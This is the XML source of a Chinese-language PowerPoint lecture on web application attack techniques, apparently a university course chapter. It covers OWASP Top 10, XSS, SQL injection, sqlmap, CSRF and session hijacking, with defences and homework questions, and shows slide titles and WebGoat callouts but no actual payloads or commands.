        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="755650" y="2276475"/>
            <a:ext cx="1727200" cy="935038"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 75278"/>
              <a:gd name="adj2" fmla="val 4838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提示对各种类型漏洞应使用的漏洞攻击程序</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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328" name="AutoShape 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2555875" y="3357563"/>
            <a:ext cx="1727200" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 25644"/>
              <a:gd name="adj2" fmla="val -121301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显示页面各种隐藏的参数值</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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329" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3419475" y="1412875"/>
            <a:ext cx="1727200" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 30606"/>
              <a:gd name="adj2" fmla="val 110486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显示页面的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</a:rPr>
              <a:t>Cookies</a:t>
            </a:r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值</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440330" name="AutoShape 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4643438" y="3429000"/>
            <a:ext cx="1727200" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4690"/>
              <a:gd name="adj2" fmla="val -123954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漏洞和攻击方法的课程学习计划</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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40331" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6156325" y="1412875"/>
            <a:ext cx="1439863" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -30046"/>
              <a:gd name="adj2" fmla="val 117106"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="89999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73025" tIns="36512" rIns="73025" bIns="36512" anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/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显示页面的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</a:rPr>
              <a:t>Java</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>源代码</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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44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44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44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44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44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44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6" grpId="0" animBg="1"/>
      <p:bldP spid="440327" grpId="0" animBg="1"/>
      <p:bldP spid="440328" grpId="0" animBg="1"/>
      <p:bldP spid="440329" grpId="0" animBg="1"/>
      <p:bldP spid="440330" grpId="0" animBg="1"/>
      <p:bldP spid="4403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Where to Learn More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413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162425"/>
            <a:ext cx="1749425" cy="2209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44134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4162425"/>
            <a:ext cx="1838325" cy="228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44135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93000" y="4162425"/>
            <a:ext cx="1574800" cy="2362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44135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94350" y="3500438"/>
            <a:ext cx="1797050" cy="2362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44135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52600" y="3573463"/>
            <a:ext cx="1836738" cy="228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441353" name="Picture 9"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7" cstate="print"/>
          <a:srcRect r="17842" b="19760"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="344488" y="1052513"/>
            <a:ext cx="1903412" cy="2397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441354" name="Picture 10"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8" cstate="print"/>
          <a:srcRect l="4665" t="9453" r="3595" b="6647"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-21600000">
            <a:off x="6965950" y="1052513"/>
            <a:ext cx="1976438" cy="23764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441355" name="Picture 1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200400" y="912813"/>
            <a:ext cx="2955925" cy="280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41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4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4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4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44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4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作业</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95236" name="AutoShape 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="250825" y="2484438"/>
            <a:ext cx="73025" cy="144462"/>
          </a:xfrm>
          <a:prstGeom prst="octagon">
            <a:avLst>
              <a:gd name="adj" fmla="val 29287"/>
            </a:avLst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66750" y="1352550"/>
            <a:ext cx="7553325" cy="4705350"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>10-1 Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>应用常见的安全漏洞有哪些？</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>10-2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>如何防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>应用中的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>注入漏洞？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kyNzU5YmZhNjU4MzM5ZTNjNzVhNGQwZGQwZWI1Yz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660,&quot;width&quot;:8560}"/>
</p:tagLst>
</file>

<file path=ppt/theme/theme1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5826</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>全屏显示(4:3)</PresentationFormat>
  <Paragraphs>603</Paragraphs>
  <Slides>112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112</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="125" baseType="lpstr">
      <vt:lpstr>Batang</vt:lpstr>
      <vt:lpstr>標楷體</vt:lpstr>
      <vt:lpstr>PMingLiU</vt:lpstr>
      <vt:lpstr>黑体</vt:lpstr>
      <vt:lpstr>楷体_GB2312</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>Arial Narrow</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Webdings</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>1_Blends</vt:lpstr>
      <vt:lpstr>第 11 章    Web网站攻击技术</vt:lpstr>
      <vt:lpstr>内容提纲</vt:lpstr>
      <vt:lpstr>Web应用</vt:lpstr>
      <vt:lpstr>Web应用程序体系结构</vt:lpstr>
      <vt:lpstr>Web应用体系结构潜在弱点</vt:lpstr>
      <vt:lpstr>HTTP协议安全问题</vt:lpstr>
      <vt:lpstr>Cookie的安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>Web应用安全的严重性</vt:lpstr>
      <vt:lpstr>NSFocus《2020网络安全观察报告》</vt:lpstr>
      <vt:lpstr>NSFocus《2020网络安全观察报告》</vt:lpstr>
      <vt:lpstr>NSFocus《2020网络安全观察报告》</vt:lpstr>
      <vt:lpstr>介绍OWASP</vt:lpstr>
      <vt:lpstr>介绍OWASP</vt:lpstr>
      <vt:lpstr> OWASP Top 10-2017 </vt:lpstr>
      <vt:lpstr> OWASP Top 10-2017 </vt:lpstr>
      <vt:lpstr> OWASP Top 10-2021 </vt:lpstr>
      <vt:lpstr>注入漏洞</vt:lpstr>
      <vt:lpstr>注入漏洞</vt:lpstr>
      <vt:lpstr>注入漏洞</vt:lpstr>
      <vt:lpstr>注入漏洞-SQL注入</vt:lpstr>
      <vt:lpstr>注入漏洞-SQL注入</vt:lpstr>
      <vt:lpstr>注入漏洞-SQL注入</vt:lpstr>
      <vt:lpstr>跨站脚本（XSS）</vt:lpstr>
      <vt:lpstr>跨站脚本（XSS）</vt:lpstr>
      <vt:lpstr>跨站脚本（XSS）</vt:lpstr>
      <vt:lpstr>(一)跨站脚本（XSS）漏洞</vt:lpstr>
      <vt:lpstr>跨站脚本攻击</vt:lpstr>
      <vt:lpstr>XSS攻击的原理</vt:lpstr>
      <vt:lpstr>XSS漏洞探测示例</vt:lpstr>
      <vt:lpstr>储存式XSS</vt:lpstr>
      <vt:lpstr>储存式XSS</vt:lpstr>
      <vt:lpstr>储存式XSS</vt:lpstr>
      <vt:lpstr>储存式</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>DOM式XSS</vt:lpstr>
      <vt:lpstr>DOM式XSS</vt:lpstr>
      <vt:lpstr>防御XSS攻击</vt:lpstr>
      <vt:lpstr>内容提纲</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>（二）注入漏洞</vt:lpstr>
      <vt:lpstr>注入漏洞</vt:lpstr>
      <vt:lpstr>SQL注入原理</vt:lpstr>
      <vt:lpstr>SQL注入攻击流程</vt:lpstr>
      <vt:lpstr>SQL注入示例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：检测</vt:lpstr>
      <vt:lpstr>SQL注入：检测</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>防御注入漏洞</vt:lpstr>
      <vt:lpstr>（三）恶意文件执行</vt:lpstr>
      <vt:lpstr>恶意文件执行</vt:lpstr>
      <vt:lpstr>防御恶意文件执行漏洞</vt:lpstr>
      <vt:lpstr>（四）不安全的直接对象引用</vt:lpstr>
      <vt:lpstr>不安全的直接对象引用</vt:lpstr>
      <vt:lpstr>目录遍历攻击举例</vt:lpstr>
      <vt:lpstr>防御不安全的直接对象引用</vt:lpstr>
      <vt:lpstr>（五）跨站请求仿冒</vt:lpstr>
      <vt:lpstr>CSRF与XSS</vt:lpstr>
      <vt:lpstr>防御CSRF攻击</vt:lpstr>
      <vt:lpstr>（六）信息泄露和不当的错误处理 </vt:lpstr>
      <vt:lpstr>信息泄露和不当的错误处理</vt:lpstr>
      <vt:lpstr>不当的错误处理示例</vt:lpstr>
      <vt:lpstr>防御信息泄露</vt:lpstr>
      <vt:lpstr>（七）认证和会话管理不完善</vt:lpstr>
      <vt:lpstr>会话(Session)管理</vt:lpstr>
      <vt:lpstr>会话管理：Session ID</vt:lpstr>
      <vt:lpstr>会话管理：Session Hijacking</vt:lpstr>
      <vt:lpstr>认证和会话管理攻击流程</vt:lpstr>
      <vt:lpstr>防御会话管理攻击</vt:lpstr>
      <vt:lpstr>（八）不安全的加密存储</vt:lpstr>
      <vt:lpstr>不安全的加密存储</vt:lpstr>
      <vt:lpstr>不安全的加密存储示例</vt:lpstr>
      <vt:lpstr>防御不安全的加密存储</vt:lpstr>
      <vt:lpstr>（九）不安全的通信</vt:lpstr>
      <vt:lpstr>不安全的通信</vt:lpstr>
      <vt:lpstr>防御不安全通信</vt:lpstr>
      <vt:lpstr>（十）URL访问缺少限制</vt:lpstr>
      <vt:lpstr>URL访问缺少限制</vt:lpstr>
      <vt:lpstr>防御缺少限制的URL访问</vt:lpstr>
      <vt:lpstr>小结</vt:lpstr>
      <vt:lpstr>跟着WebGoat一起学习</vt:lpstr>
      <vt:lpstr>Where to Learn More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unknown</dc:creator>
  <cp:lastModifiedBy>rlp</cp:lastModifiedBy>
  <cp:revision>1472</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2004-07-10T13:16:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-05-19T06:54:36Z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7F5CA11BFE834C66AE3D413E0A8ED2FB</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-11.1.0.11744</vt:lpwstr>
  </property>
</Properties>
</file>